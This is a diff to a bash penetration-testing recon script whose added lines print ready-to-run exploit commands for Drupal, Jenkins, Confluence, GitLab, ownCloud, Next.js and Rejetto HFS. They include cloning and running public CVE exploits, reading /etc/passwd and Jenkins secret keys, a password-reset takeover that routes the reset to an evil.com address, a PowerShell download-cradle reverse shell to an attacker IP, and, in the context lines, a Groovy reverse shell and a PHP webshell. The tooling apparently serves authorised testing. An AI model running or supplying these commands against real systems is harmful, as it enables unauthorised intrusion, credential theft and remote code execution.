@@ -2048,7 +2048,10 @@ generate_summary() {
                 echo "  Drupal detected:"
                 echo "  droopescan scan drupal -u ${url}"
                 echo "  curl -sk ${url%/}/CHANGELOG.txt | head -5   # confirm version"
-                echo "  # Check Drupalgeddon: msfconsole -q -x 'use exploit/unix/webapp/drupal_drupalgeddon2; set RHOSTS $ip; run'"
+                echo "  # CVE-2018-7600 Drupalgeddon2 (Drupal <7.58 / <8.3.9 / <8.4.6 / <8.5.1) — no-MSF PoC:"
+                echo "  git clone https://github.com/dreadlocked/Drupalgeddon2 /tmp/drupalgeddon2 2>/dev/null && ruby /tmp/drupalgeddon2/drupalgeddon2.rb ${url}"
+                echo "  # Python alt: https://github.com/a2u/CVE-2018-7600"
+                echo "  # CVE-2019-6340 Drupalgeddon3 (8.5.x/8.6.x REST) — see https://github.com/leonjza/CVE-2019-6340"
             fi
 
             # Apache Tomcat
@@ -2070,6 +2073,12 @@ generate_summary() {
                 cms_any=true
                 echo "  Jenkins detected:"
                 echo "  curl -sk ${url%/}/login   # unauthenticated check"
+                echo "  curl -sk ${url%/}/ | grep -oE 'Jenkins [0-9.]+' | head -1"
+                echo "  # CVE-2024-23897 unauth arbitrary file read (Jenkins <2.442 / LTS <2.426.3) — Jan 2024:"
+                echo "  wget -q '${url%/}/jnlpJars/jenkins-cli.jar' -O /tmp/jenkins-cli.jar"
+                echo "  java -jar /tmp/jenkins-cli.jar -s '${url}' -http connect-node '@/etc/passwd' 2>&1 | tail -30"
+                echo "  java -jar /tmp/jenkins-cli.jar -s '${url}' -http help '@/var/jenkins_home/secrets/master.key' 2>&1 | tail -5"
+                echo "  # Chain: read secrets/master.key + credentials.xml → decrypt → admin → RCE"
                 echo "  # Script console RCE (if admin access): ${url%/}/script"
                 echo "  # Groovy reverse shell in script console:"
                 echo "  # String cmd = 'bash -i >& /dev/tcp/${KALI_IP}/4444 0>&1'"
@@ -2086,6 +2095,69 @@ generate_summary() {
                 echo "  # Default creds: root/root, root/<blank>, phpmyadmin/phpmyadmin"
                 echo "  # If access: SELECT '<?php system(\$_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'"
                 echo "  # Trigger: curl '${url%/}/shell.php?cmd=id'"
+            fi
+
+            # Atlassian Confluence — CVE-2023-22527 unauth OGNL RCE (Jan 2024, 8.0.0-8.5.3)
+            if grep -qi 'Confluence' "$cms_whatweb" 2>/dev/null || \
+               grep -qi 'login.action\|dashboard.action' "$cms_paths" 2>/dev/null; then
+                cms_any=true
+                echo "  Atlassian Confluence detected:"
+                echo "  curl -sk ${url%/}/login.action | grep -oE 'Confluence [0-9.]+' | head -1"
+                echo "  # CVE-2023-22527 unauth OGNL RCE (Confluence 8.0.0-8.5.3, fixed 8.5.4) — Jan 2024:"
+                echo "  git clone https://github.com/Chocapikk/CVE-2023-22527 /tmp/cve-2023-22527 2>/dev/null"
+                echo "  python3 /tmp/cve-2023-22527/exploit.py -u ${url} -c 'id'"
+                echo "  # Fallback to CVE-2022-26134 (Confluence <7.18.1) — https://github.com/h3v0x/CVE-2022-26134"
+                echo "  # Earlier CVE-2019-3396 path traversal → https://github.com/Yt1g3r/CVE-2019-3396_EXP"
+            fi
+
+            # GitLab — CVE-2023-7028 unauth account takeover (Jan 2024, 16.1.0-16.7.1)
+            if grep -qi 'GitLab' "$cms_whatweb" 2>/dev/null || \
+               grep -qi '/users/sign_in\|/-/graphql' "$cms_paths" 2>/dev/null; then
+                cms_any=true
+                echo "  GitLab detected:"
+                echo "  curl -sk ${url%/}/help | grep -oE 'GitLab (Community|Enterprise) Edition [0-9.]+' | head -1"
+                echo "  # CVE-2023-7028 unauth admin takeover via password reset (GitLab 16.1.0-16.7.1):"
+                echo "  curl -sk -X POST '${url%/}/users/password' \\\\"
+                echo "    -H 'Content-Type: application/x-www-form-urlencoded' \\\\"
+                echo "    --data 'user[email][]=admin@target.local&user[email][]=ATTACKER@evil.com'"
+                echo "  # → reset link sent to BOTH emails; click the attacker one, set new admin password"
+                echo "  # Post-admin: register a malicious runner or push .gitlab-ci.yml to a proj for RCE"
+                echo "  # Older: CVE-2021-22205 ExifTool RCE (unauth) — https://github.com/Al1ex/CVE-2021-22205"
+            fi
+
+            # ownCloud — CVE-2023-49103 credential/env disclosure (Nov 2023, 10.6.0-10.13.0)
+            if grep -qi 'ownCloud\|owncloud' "$cms_whatweb" 2>/dev/null; then
+                cms_any=true
+                echo "  ownCloud detected:"
+                echo "  # CVE-2023-49103 phpinfo leaks env vars incl. DB/admin creds (graphapi 0.2.x-0.3.0):"
+                echo "  curl -sk '${url%/}/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php' \\\\"
+                echo "    | grep -iE 'OWNCLOUD_(DB|ADMIN)|_ENV\\\\[|SECRET|PASSWORD|API_KEY|MYSQL_' | head -20"
+                echo "  # Alt path (some installs): ${url%/}/index.php/apps/graphapi/vendor/.../GetPhpInfo.php"
+            fi
+
+            # Next.js — CVE-2025-29927 middleware auth bypass (Mar 2025, <14.2.25 / <15.2.3)
+            if grep -qiE 'Next[.]?js|X-Powered-By:\s*Next' "$cms_whatweb" 2>/dev/null || \
+               grep -qiE '_next/static|/__next' "$cms_paths" 2>/dev/null; then
+                cms_any=true
+                echo "  Next.js detected:"
+                echo "  # CVE-2025-29927 middleware bypass — magic header skips middleware auth/validation:"
+                echo "  for p in /admin /dashboard /api/admin /protected /settings; do"
+                echo "    code_without=\$(curl -sk -o /dev/null -w '%{http_code}' '${url}'\$p)"
+                echo "    code_with=\$(curl -sk -o /dev/null -w '%{http_code}' '${url}'\$p -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware')"
+                echo "    echo \"\$p  without=\$code_without  with=\$code_with  \$([ \$code_without != \$code_with ] && echo BYPASS!)\""
+                echo "  done"
+                echo "  # Also try subrequest chain: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware"
+            fi
+
+            # Rejetto HFS 2.x — CVE-2024-23692 unauth template RCE (Jun 2024, 2.3m-2.4)
+            if grep -qiE 'HttpFileServer|HFS\s*2\.|Rejetto' "$cms_whatweb" 2>/dev/null; then
+                cms_any=true
+                echo "  Rejetto HFS 2.x detected:"
+                echo "  # CVE-2024-23692 unauth template RCE via search param:"
+                echo "  curl -sk \"${url%/}/?search=%00{.exec|whoami.}\"           # Windows"
+                echo "  curl -sk \"${url%/}/?search=%00{.exec|id.}\"                # Linux (if applicable)"
+                echo "  # Reverse shell (Windows): curl -sk \"${url%/}/?search=%00{.exec|powershell -c IEX(New-Object Net.WebClient).DownloadString('http://${KALI_IP}/rev.ps1').}\""
+                echo "  # Public PoC: https://github.com/ifconfig-me/CVE-2024-23692"
             fi
 
             [[ "$cms_any" == "false" ]] && echo "  (no non-WordPress CMS detected)"
